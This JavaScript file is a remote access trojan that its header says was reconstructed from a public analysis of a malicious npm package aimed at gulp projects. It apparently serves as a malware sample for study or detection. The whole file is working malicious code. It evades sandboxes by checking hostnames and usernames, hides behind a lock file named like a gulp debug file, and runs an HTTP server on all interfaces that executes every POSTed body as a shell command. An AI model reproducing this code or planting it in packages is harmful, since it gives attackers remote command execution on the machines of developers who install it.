// websocket-rat — reconstructed from public security analyses
// Source: https://blog.phylum.io/sophisticated-rat-shell-targeting-gulp-projects-on-npm/
//
// HTTP-based RAT server that listens on localhost. Every received
// message is executed as a shell command. Lock file mechanism
// prevents multiple instances.
//
// Technique: HTTP RAT server + command execution + lock file persistence

const http = require("http");
const { exec } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");

var LOCK_FILE = path.join(os.tmpdir(), ".gulp-debug.lock");
var PORT = 3004;

// Check environment — abort if sandbox detected
function checkEnv() {
  var hostname = os.hostname().toLowerCase();
  if (hostname.includes("sandbox") || hostname.includes("malware") || hostname.includes("analysis")) {
    process.exit(0);
  }
  var user = os.userInfo().username.toLowerCase();
  if (user === "malware" || user === "sandbox" || user === "analyst") {
    process.exit(0);
  }
  return true;
}

// Lock file to prevent multiple instances
function acquireLock() {
  try {
    if (fs.existsSync(LOCK_FILE)) {
      var pid = parseInt(fs.readFileSync(LOCK_FILE, "utf8"));
      try {
        process.kill(pid, 0);
        return false; // Process still running
      } catch(e) {
        // Process no longer running, take over lock
      }
    }
    fs.writeFileSync(LOCK_FILE, String(process.pid));
    return true;
  } catch(e) {
    return false;
  }
}

// Start RAT server
function startServer() {
  var server = http.createServer(function(req, res) {
    if (req.method === "POST") {
      var body = "";
      req.on("data", function(chunk) { body += chunk; });
      req.on("end", function() {
        // Execute received command
        exec(body, { timeout: 30000 }, function(err, stdout, stderr) {
          res.writeHead(200, { "Content-Type": "text/plain" });
          res.end(stdout + (stderr ? "\nSTDERR: " + stderr : ""));
        });
      });
    } else {
      res.writeHead(200);
      res.end("OK");
    }
  });

  server.listen(PORT, "0.0.0.0", function() {});
  server.on("error", function() {});
}

if (checkEnv() && acquireLock()) {
  startServer();
}
